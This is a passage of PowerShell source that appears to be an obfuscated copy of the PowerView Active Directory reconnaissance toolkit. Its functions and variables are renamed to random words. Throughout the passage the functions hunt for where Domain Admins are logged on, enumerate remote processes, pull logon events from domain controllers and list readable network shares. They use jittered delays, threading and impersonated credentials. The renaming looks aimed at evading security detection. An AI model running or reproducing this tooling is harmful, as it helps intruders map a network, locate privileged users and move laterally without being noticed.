                        if (($rYdFULpQ99) -and ($rYdFULpQ99.Trim() -ne '') -and ($rYdFULpQ99 -notmatch $OovKwvOv99) -and ($rYdFULpQ99 -notmatch '\$$')) {
                            if ( (-not $RRdVovJL99) -or ($RRdVovJL99 -contains $rYdFULpQ99)) {
                                $Iwwclvtq99 = New-Object PSObject
                                $Iwwclvtq99 | Add-Member Noteproperty 'UserDomain' $Null
                                $Iwwclvtq99 | Add-Member Noteproperty 'UserName' $rYdFULpQ99
                                $Iwwclvtq99 | Add-Member Noteproperty 'ComputerName' $WtURHswp99
                                $Iwwclvtq99 | Add-Member Noteproperty 'SessionFrom' $CName
                                try {
                                    $xXBESuTF99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $Iwwclvtq99 | Add-Member NoteProperty 'SessionFromName' $xXBESuTF99
                                }
                                catch {
                                    $Iwwclvtq99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }
                                if ($QonjCJkk99) {
                                    $Admin = (illegitimate -kyzUdCPm99 $CName).IsAdmin
                                    $Iwwclvtq99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $Iwwclvtq99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $Iwwclvtq99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $Iwwclvtq99
                            }
                        }
                    }
                    if (-not $AKQEQUbD99) {
                        $oKMCiKka99 = cheerily -kyzUdCPm99 $WtURHswp99
                        ForEach ($User in $oKMCiKka99) {
                            $rYdFULpQ99 = $User.UserName
                            $BUwbCXsa99 = $User.LogonDomain
                            if (($rYdFULpQ99) -and ($rYdFULpQ99.trim() -ne '')) {
                                if ( (-not $RRdVovJL99) -or ($RRdVovJL99 -contains $rYdFULpQ99) -and ($rYdFULpQ99 -notmatch '\$$')) {
                                    $uaBrbSJB99 = @(glares -kyzUdCPm99 $WtURHswp99)[0].IPAddress
                                    $Iwwclvtq99 = New-Object PSObject
                                    $Iwwclvtq99 | Add-Member Noteproperty 'UserDomain' $BUwbCXsa99
                                    $Iwwclvtq99 | Add-Member Noteproperty 'UserName' $rYdFULpQ99
                                    $Iwwclvtq99 | Add-Member Noteproperty 'ComputerName' $WtURHswp99
                                    $Iwwclvtq99 | Add-Member Noteproperty 'IPAddress' $uaBrbSJB99
                                    $Iwwclvtq99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $Iwwclvtq99 | Add-Member Noteproperty 'SessionFromName' $Null
                                    if ($QonjCJkk99) {
                                        $Admin = illegitimate -kyzUdCPm99 $WtURHswp99
                                        $Iwwclvtq99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $Iwwclvtq99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $Iwwclvtq99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $Iwwclvtq99
                                }
                            }
                        }
                    }
                }
            }
            if ($ojJXfOPB99) {
                contemptuous
            }
        }
        $GrTBJoNj99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
            }
            else {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[telexed] Total number of hosts: $($yfurrppc99.count)"
            Write-Verbose "[telexed] Delay: $Delay, Jitter: $wVJhboDL99"
            $WeaNemCn99 = 0
            $qncmWJHM99 = New-Object System.Random
            ForEach ($WtURHswp99 in $yfurrppc99) {
                $WeaNemCn99 = $WeaNemCn99 + 1
                Start-Sleep -Seconds $qncmWJHM99.Next((1-$wVJhboDL99)*$Delay, (1+$wVJhboDL99)*$Delay)
                Write-Verbose "[telexed] Enumerating server $GucPfsvo99 ($WeaNemCn99 of $($yfurrppc99.Count))"
                Invoke-Command -nkMTuquD99 $NhmrWRhM99 -ArgumentList $WtURHswp99, $RRdVovJL99, $OovKwvOv99, $AKQEQUbD99, $GrTBJoNj99
                if ($sBoEOClb99 -and $QkcKhzFA99) {
                    Write-Verbose "[telexed] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[telexed] Using threading with threads: $tKOqLWOE99"
            Write-Verbose "[telexed] TargetComputers length: $($yfurrppc99.Length)"
            $rMIpZNFK99 = @{
                'TargetUsers' = $RRdVovJL99
                'CurrentUser' = $OovKwvOv99
                'Stealth' = $AKQEQUbD99
                'TokenHandle' = $GrTBJoNj99
            }
            prohibits -kyzUdCPm99 $yfurrppc99 -nkMTuquD99 $NhmrWRhM99 -PdoqDAIx99 $rMIpZNFK99 -tKOqLWOE99 $tKOqLWOE99
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function subsections {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $kyzUdCPm99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $rWNKtRhC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NVeRyhya99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IwyMamDv99,
        [Alias('Unconstrained')]
        [Switch]
        $sihUJTgN99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $QQiShXII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $SnjbhqHK99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gsQnsIwP99,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $xwUAHosz99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $GMxPBqaF99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $BUwbCXsa99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $BuGyErks99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZfUQuSoq99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $IFhNxjOg99 = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $JYtTYuqv99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $QkcKhzFA99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $wVJhboDL99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $tKOqLWOE99 = 20
    )
    BEGIN {
        $rkhpGCag99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $rkhpGCag99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['ComputerDomain']) { $rkhpGCag99['Domain'] = $rWNKtRhC99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rkhpGCag99['LDAPFilter'] = $NVeRyhya99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rkhpGCag99['SearchBase'] = $IwyMamDv99 }
        if ($PSBoundParameters['Unconstrained']) { $rkhpGCag99['Unconstrained'] = $xbKFrKFs99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rkhpGCag99['OperatingSystem'] = $cHJdXVHn99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rkhpGCag99['ServicePack'] = $kVBIYPdx99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rkhpGCag99['SiteName'] = $TQljdANP99 }
        if ($PSBoundParameters['Server']) { $rkhpGCag99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $rkhpGCag99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $rkhpGCag99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rkhpGCag99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $rkhpGCag99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $rkhpGCag99['Credential'] = $DOZPHpup99 }
        $BuvdgfSf99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $BuvdgfSf99['Identity'] = $GMxPBqaF99 }
        if ($PSBoundParameters['Domain']) { $BuvdgfSf99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['UserDomain']) { $BuvdgfSf99['Domain'] = $BUwbCXsa99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $BuvdgfSf99['LDAPFilter'] = $BuGyErks99 }
        if ($PSBoundParameters['UserSearchBase']) { $BuvdgfSf99['SearchBase'] = $ZfUQuSoq99 }
        if ($PSBoundParameters['UserAdminCount']) { $BuvdgfSf99['AdminCount'] = $JYtTYuqv99 }
        if ($PSBoundParameters['Server']) { $BuvdgfSf99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $BuvdgfSf99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $BuvdgfSf99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BuvdgfSf99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $BuvdgfSf99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $BuvdgfSf99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['ComputerName']) {
            $yfurrppc99 = $kyzUdCPm99
        }
        else {
            Write-Verbose '[subsections] Querying computers in the domain'
            $yfurrppc99 = boozed @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[subsections] TargetComputers length: $($yfurrppc99.Length)"
        if ($yfurrppc99.Length -eq 0) {
            throw '[subsections] No hosts found to enumerate'
        }
        if ($PSBoundParameters['ProcessName']) {
            $JFbnOJqT99 = @()
            ForEach ($T in $xwUAHosz99) {
                $JFbnOJqT99 += $T.Split(',')
            }
            if ($JFbnOJqT99 -isnot [System.Array]) {
                $JFbnOJqT99 = [String[]] @($JFbnOJqT99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $RRdVovJL99 = togae @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $IjNRsCVr99 = @{
                'Identity' = $IFhNxjOg99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $IjNRsCVr99['Domain'] = $BUwbCXsa99 }
            if ($PSBoundParameters['UserSearchBase']) { $IjNRsCVr99['SearchBase'] = $ZfUQuSoq99 }
            if ($PSBoundParameters['Server']) { $IjNRsCVr99['Server'] = $YdBDxrjg99 }
            if ($PSBoundParameters['SearchScope']) { $IjNRsCVr99['SearchScope'] = $eLpWCwqM99 }
            if ($PSBoundParameters['ResultPageSize']) { $IjNRsCVr99['ResultPageSize'] = $xRYvUWYi99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $IjNRsCVr99['ServerTimeLimit'] = $vqNdfRPs99 }
            if ($PSBoundParameters['Tombstone']) { $IjNRsCVr99['Tombstone'] = $CnaAXLuN99 }
            if ($PSBoundParameters['Credential']) { $IjNRsCVr99['Credential'] = $DOZPHpup99 }
            $IjNRsCVr99
            $RRdVovJL99 = expostulation @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $NhmrWRhM99 = {
            Param($kyzUdCPm99, $xwUAHosz99, $RRdVovJL99, $DOZPHpup99)
            ForEach ($WtURHswp99 in $kyzUdCPm99) {
                $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $WtURHswp99
                if ($Up) {
                    if ($DOZPHpup99) {
                        $EOrJMIXp99 = amiss -DOZPHpup99 $DOZPHpup99 -kyzUdCPm99 $WtURHswp99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $EOrJMIXp99 = amiss -kyzUdCPm99 $WtURHswp99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($aXyFQkCP99 in $EOrJMIXp99) {
                        if ($xwUAHosz99) {
                            if ($xwUAHosz99 -Contains $aXyFQkCP99.ProcessName) {
                                $aXyFQkCP99
                            }
                        }
                        elseif ($RRdVovJL99 -Contains $aXyFQkCP99.User) {
                            $aXyFQkCP99
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[subsections] Total number of hosts: $($yfurrppc99.count)"
            Write-Verbose "[subsections] Delay: $Delay, Jitter: $wVJhboDL99"
            $WeaNemCn99 = 0
            $qncmWJHM99 = New-Object System.Random
            ForEach ($WtURHswp99 in $yfurrppc99) {
                $WeaNemCn99 = $WeaNemCn99 + 1
                Start-Sleep -Seconds $qncmWJHM99.Next((1-$wVJhboDL99)*$Delay, (1+$wVJhboDL99)*$Delay)
                Write-Verbose "[subsections] Enumerating server $WtURHswp99 ($WeaNemCn99 of $($yfurrppc99.count))"
                $sBoEOClb99 = Invoke-Command -nkMTuquD99 $NhmrWRhM99 -ArgumentList $WtURHswp99, $JFbnOJqT99, $RRdVovJL99, $DOZPHpup99
                $sBoEOClb99
                if ($sBoEOClb99 -and $QkcKhzFA99) {
                    Write-Verbose "[subsections] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[subsections] Using threading with threads: $tKOqLWOE99"
            $rMIpZNFK99 = @{
                'ProcessName' = $JFbnOJqT99
                'TargetUsers' = $RRdVovJL99
                'Credential' = $DOZPHpup99
            }
            prohibits -kyzUdCPm99 $yfurrppc99 -nkMTuquD99 $NhmrWRhM99 -PdoqDAIx99 $rMIpZNFK99 -tKOqLWOE99 $tKOqLWOE99
        }
    }
}
function floras {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $nQZyhrEp99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $GhHvCerq99 = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $eMsiwZGv99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $tcxZrOfw99 = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $GMxPBqaF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $BUwbCXsa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $BuGyErks99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZfUQuSoq99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $IFhNxjOg99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $JYtTYuqv99,
        [Switch]
        $QonjCJkk99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $QkcKhzFA99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $wVJhboDL99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $tKOqLWOE99 = 20
    )
    BEGIN {
        $BuvdgfSf99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $BuvdgfSf99['Identity'] = $GMxPBqaF99 }
        if ($PSBoundParameters['UserDomain']) { $BuvdgfSf99['Domain'] = $BUwbCXsa99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $BuvdgfSf99['LDAPFilter'] = $BuGyErks99 }
        if ($PSBoundParameters['UserSearchBase']) { $BuvdgfSf99['SearchBase'] = $ZfUQuSoq99 }
        if ($PSBoundParameters['UserAdminCount']) { $BuvdgfSf99['AdminCount'] = $JYtTYuqv99 }
        if ($PSBoundParameters['Server']) { $BuvdgfSf99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $BuvdgfSf99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $BuvdgfSf99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BuvdgfSf99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $BuvdgfSf99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $BuvdgfSf99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $RRdVovJL99 = togae @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $IjNRsCVr99 = @{
                'Identity' = $IFhNxjOg99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $IFhNxjOg99"
            if ($PSBoundParameters['UserDomain']) { $IjNRsCVr99['Domain'] = $BUwbCXsa99 }
            if ($PSBoundParameters['UserSearchBase']) { $IjNRsCVr99['SearchBase'] = $ZfUQuSoq99 }
            if ($PSBoundParameters['Server']) { $IjNRsCVr99['Server'] = $YdBDxrjg99 }
            if ($PSBoundParameters['SearchScope']) { $IjNRsCVr99['SearchScope'] = $eLpWCwqM99 }
            if ($PSBoundParameters['ResultPageSize']) { $IjNRsCVr99['ResultPageSize'] = $xRYvUWYi99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $IjNRsCVr99['ServerTimeLimit'] = $vqNdfRPs99 }
            if ($PSBoundParameters['Tombstone']) { $IjNRsCVr99['Tombstone'] = $CnaAXLuN99 }
            if ($PSBoundParameters['Credential']) { $IjNRsCVr99['Credential'] = $DOZPHpup99 }
            $RRdVovJL99 = expostulation @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters['ComputerName']) {
            $yfurrppc99 = $kyzUdCPm99
        }
        else {
            $PRJYJLsQ99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $PRJYJLsQ99['Domain'] = $jeGdZvYa99 }
            if ($PSBoundParameters['Server']) { $PRJYJLsQ99['Server'] = $YdBDxrjg99 }
            if ($PSBoundParameters['Credential']) { $PRJYJLsQ99['Credential'] = $DOZPHpup99 }
            Write-Verbose "[floras] Querying for domain controllers in domain: $jeGdZvYa99"
            $yfurrppc99 = shriller @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($yfurrppc99 -and ($yfurrppc99 -isnot [System.Array])) {
            $yfurrppc99 = @(,$yfurrppc99)
        }
        Write-Verbose "[floras] TargetComputers length: $($yfurrppc99.Length)"
        Write-Verbose "[floras] TargetComputers $yfurrppc99"
        if ($yfurrppc99.Length -eq 0) {
            throw '[floras] No hosts found to enumerate'
        }
        $NhmrWRhM99 = {
            Param($kyzUdCPm99, $GhHvCerq99, $eMsiwZGv99, $tcxZrOfw99, $RRdVovJL99, $nQZyhrEp99, $DOZPHpup99)
            ForEach ($WtURHswp99 in $kyzUdCPm99) {
                $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $WtURHswp99
                if ($Up) {
                    $xHlajOGa99 = @{
                        'ComputerName' = $WtURHswp99
                    }
                    if ($GhHvCerq99) { $xHlajOGa99['StartTime'] = $GhHvCerq99 }
                    if ($eMsiwZGv99) { $xHlajOGa99['EndTime'] = $eMsiwZGv99 }
                    if ($tcxZrOfw99) { $xHlajOGa99['MaxEvents'] = $tcxZrOfw99 }
                    if ($DOZPHpup99) { $xHlajOGa99['Credential'] = $DOZPHpup99 }
                    if ($nQZyhrEp99 -or $RRdVovJL99) {
                        if ($RRdVovJL99) {
                            trisect @DomainUserEventArgs | Where-Object {$RRdVovJL99 -contains $_.TargetUserName}
                        }
                        else {
                            $vvftjYaa99 = 'or'
                            $nQZyhrEp99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($nQZyhrEp99[$_] -match '&') -or ($nQZyhrEp99[$_] -eq 'and')) {
                                        $vvftjYaa99 = 'and'
                                    }
                                }
                            }
                            $Keys = $nQZyhrEp99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            trisect @DomainUserEventArgs | ForEach-Object {
                                if ($vvftjYaa99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $nQZyhrEp99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $nQZyhrEp99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        trisect @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[floras] Total number of hosts: $($yfurrppc99.count)"
            Write-Verbose "[floras] Delay: $Delay, Jitter: $wVJhboDL99"
            $WeaNemCn99 = 0
            $qncmWJHM99 = New-Object System.Random
            ForEach ($WtURHswp99 in $yfurrppc99) {
                $WeaNemCn99 = $WeaNemCn99 + 1
                Start-Sleep -Seconds $qncmWJHM99.Next((1-$wVJhboDL99)*$Delay, (1+$wVJhboDL99)*$Delay)
                Write-Verbose "[floras] Enumerating server $WtURHswp99 ($WeaNemCn99 of $($yfurrppc99.count))"
                $sBoEOClb99 = Invoke-Command -nkMTuquD99 $NhmrWRhM99 -ArgumentList $WtURHswp99, $GhHvCerq99, $eMsiwZGv99, $tcxZrOfw99, $RRdVovJL99, $nQZyhrEp99, $DOZPHpup99
                $sBoEOClb99
                if ($sBoEOClb99 -and $QkcKhzFA99) {
                    Write-Verbose "[floras] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[floras] Using threading with threads: $tKOqLWOE99"
            $rMIpZNFK99 = @{
                'StartTime' = $GhHvCerq99
                'EndTime' = $eMsiwZGv99
                'MaxEvents' = $tcxZrOfw99
                'TargetUsers' = $RRdVovJL99
                'Filter' = $nQZyhrEp99
                'Credential' = $DOZPHpup99
            }
            prohibits -kyzUdCPm99 $yfurrppc99 -nkMTuquD99 $NhmrWRhM99 -PdoqDAIx99 $rMIpZNFK99 -tKOqLWOE99 $tKOqLWOE99
        }
    }
}
function Reinhold {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $kyzUdCPm99,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $rWNKtRhC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NVeRyhya99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IwyMamDv99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $QQiShXII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $SnjbhqHK99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gsQnsIwP99,
        [Alias('CheckAccess')]
        [Switch]
        $tCtqDgYY99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $wVJhboDL99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $tKOqLWOE99 = 20
    )
    BEGIN {
        $rkhpGCag99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rkhpGCag99['Domain'] = $rWNKtRhC99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rkhpGCag99['LDAPFilter'] = $NVeRyhya99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rkhpGCag99['SearchBase'] = $IwyMamDv99 }
        if ($PSBoundParameters['Unconstrained']) { $rkhpGCag99['Unconstrained'] = $xbKFrKFs99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rkhpGCag99['OperatingSystem'] = $cHJdXVHn99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rkhpGCag99['ServicePack'] = $kVBIYPdx99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rkhpGCag99['SiteName'] = $TQljdANP99 }
        if ($PSBoundParameters['Server']) { $rkhpGCag99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $rkhpGCag99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $rkhpGCag99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rkhpGCag99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $rkhpGCag99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $rkhpGCag99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['ComputerName']) {
            $yfurrppc99 = $kyzUdCPm99
        }
        else {
            Write-Verbose '[Reinhold] Querying computers in the domain'
            $yfurrppc99 = boozed @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Reinhold] TargetComputers length: $($yfurrppc99.Length)"
        if ($yfurrppc99.Length -eq 0) {
            throw '[Reinhold] No hosts found to enumerate'
        }
        $NhmrWRhM99 = {
            Param($kyzUdCPm99, $tCtqDgYY99, $ojJXfOPB99)
            if ($ojJXfOPB99) {
                $Null = Salem -ojJXfOPB99 $ojJXfOPB99 -Quiet
            }
            ForEach ($WtURHswp99 in $kyzUdCPm99) {
                $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $WtURHswp99
                if ($Up) {
                    $smjMcSTm99 = blouse -kyzUdCPm99 $WtURHswp99
                    ForEach ($Share in $smjMcSTm99) {
                        $rfHKqDFW99 = $Share.Name
                        $Path = '\\'+$WtURHswp99+'\'+$rfHKqDFW99
                        if (($rfHKqDFW99) -and ($rfHKqDFW99.trim() -ne '')) {
                            if ($tCtqDgYY99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
